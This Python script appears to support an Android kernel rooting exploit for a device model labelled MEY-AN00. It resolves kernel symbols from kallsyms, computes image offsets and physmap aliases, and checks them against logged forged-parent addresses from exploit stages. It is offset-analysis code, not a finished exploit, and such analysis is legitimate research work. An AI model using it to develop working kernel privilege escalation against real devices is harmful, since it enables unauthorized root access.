#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
H12: 用 kallsyms 反查 misc_list / ctl_table[boot_id] / uhid_misc 的原始定义位置，
      并用 Image-mey 验证 .data 段的物理布局，确认 stage0/stageB 的目标同页。
"""
import re, struct
IMG = r"D:\MEY-AN00-root-repro\analysis\scratch\Image-mey"
KS  = r"D:\MEY-AN00-root-repro\analysis\output\kallsyms_mey_an00.txt"
TEXT = 0xffffffc080000000
data = open(IMG, "rb").read()

# 1) kallsyms 里查关键符号
want = ["misc_list", "uhid_misc", "uhid_fops", "ashmem_ioctl", "ashmem_fops",
        "sysctl_bootid", "random_sysctl", "timerqueue_del", "rb_erase",
        "ashmem_open", "ashmem_release"]
print("="*84)
print("kallsyms 关键符号")
print("="*84)
syms = {}
for line in open(KS, encoding="utf-8", errors="replace"):
    parts = line.split()
    if len(parts) >= 3:
        try: addr = int(parts[0], 16)
        except ValueError: continue
        name = parts[2]
        if name in want and name not in syms:
            syms[name] = addr
for w in want:
    a = syms.get(w)
    print("  %-20s %s" % (w, ("%#x" % a) if a else "NOT FOUND"))

# 2) 计算 image offset 与差值
def io(a): return a - TEXT
print("\n" + "="*84)
print("image offset 与同页判定 (4K = 0x1000)")
print("="*84)
pairs = []
if "misc_list" in syms: pairs.append(("misc_list", syms["misc_list"]))
if "uhid_misc" in syms: pairs.append(("uhid_misc", syms["uhid_misc"]))
if "uhid_fops" in syms: pairs.append(("uhid_fops", syms["uhid_fops"]))
if "ashmem_fops" in syms: pairs.append(("ashmem_fops", syms["ashmem_fops"]))
for n, a in pairs:
    print("  %-16s vaddr=%#x  image_off=%#x  page=%#x" % (n, a, io(a), io(a) & ~0xFFF))

# ctl_table[boot_id] 的猜测地址
CTL_BOOTID = 0xffffffc08229b090
print("  %-16s vaddr=%#x  image_off=%#x  page=%#x  (MEY_DIRECT_BOOTID_PARENT 对应的 image 域)" %
      ("ctl[boot_id]", CTL_BOOTID, io(CTL_BOOTID), io(CTL_BOOTID) & ~0xFFF))

# 3) 验证同页
if "misc_list" in syms:
    d = syms["misc_list"] - CTL_BOOTID
    print("\n  misc_list - ctl[boot_id] = %#x  (同页? %s)" % (d, (io(syms['misc_list']) & ~0xFFF) == (io(CTL_BOOTID) & ~0xFFF)))

# 4) physmap 别名换算（P0 域）
LINK_IMAGE_BASE = TEXT
MEY_PHYS_DELTA = 0x28000000
DIRECT_MAP_BEGIN = LINK_IMAGE_BASE + MEY_PHYS_DELTA
print("\n" + "="*84)
print("physmap 别名换算 (DIRECT_MAP_BEGIN=%#x, DELTA=%#x)" % (DIRECT_MAP_BEGIN, MEY_PHYS_DELTA))
print("="*84)
for n, a in pairs:
    alias = DIRECT_MAP_BEGIN + (a - LINK_IMAGE_BASE)
    print("  %-16s image=%#x  physmap_alias=%#x" % (n, a, alias))
print("  %-16s image=%#x  physmap_alias=%#x" %
      ("ctl[boot_id]", CTL_BOOTID, DIRECT_MAP_BEGIN + (CTL_BOOTID - LINK_IMAGE_BASE)))

# 5) stage0 / stageB 的 forged_parent 实测值 vs 计算值
print("\n" + "="*84)
print("实测对照 (slide=0x22c8c00000)")
print("="*84)
slide = 0x22c8c00000
print("  stage0 forged_parent 实测 = 0xffffff802a29b090（日志 q0）")
print("        计算 P0alias(ctl[boot_id]) = %#x" % (DIRECT_MAP_BEGIN + (CTL_BOOTID - LINK_IMAGE_BASE)))
print("  stageB forged_parent 实测 = 0xffffff802a29b188（FAKE_ORDER1_MULTI 日志）")
print("        计算 P0alias(misc_list)-8 = %#x" % (DIRECT_MAP_BEGIN + (syms['misc_list'] - LINK_IMAGE_BASE) - 8))
print("  若用 image 域: misc_list+slide-8 = %#x" % (syms['misc_list'] + slide - 8))
